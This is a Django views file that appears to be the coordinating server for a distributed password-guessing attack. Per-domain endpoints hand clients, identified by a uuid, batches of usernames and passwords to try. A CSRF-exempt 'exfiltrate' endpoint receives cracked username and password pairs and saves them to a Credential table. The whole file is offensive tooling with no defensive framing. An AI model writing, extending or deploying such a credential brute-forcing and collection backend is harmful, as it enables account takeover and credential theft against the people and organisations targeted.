import json

from django.http import HttpResponse, JsonResponse
from django.template import loader
from django.views.decorators.csrf import csrf_exempt

from app.models import Credential, Domain, Client
from app.offset import *


def index(request, domain):
    find = Domain.objects.get(name=domain)
    template = loader.get_template('app/index.html')
    context = {
        'domain': find
    }
    return HttpResponse(template.render(context, request))


@csrf_exempt
def exfiltrate(request, domain):
    find = Domain.objects.get(name=domain)
    cred_json = json.loads(request.body)
    cred = Credential(username=cred_json['username'], password=cred_json['password'], domain=find)
    cred.save()
    return HttpResponse(status=204)


def usernames(request, domain):
    client = Client.objects.get(uuid=request.GET['uuid'])
    offset = next_username_offset(Domain.objects.get(name=domain), client, timezone.now())

    return JsonResponse({'usernames': list(offset.values())})


def passwords(request, domain):
    client = Client.objects.get(uuid=request.GET['uuid'])
    offset = next_password_offset(Domain.objects.get(name=domain), client, timezone.now())

    return JsonResponse({'passwords': list(offset.values())})
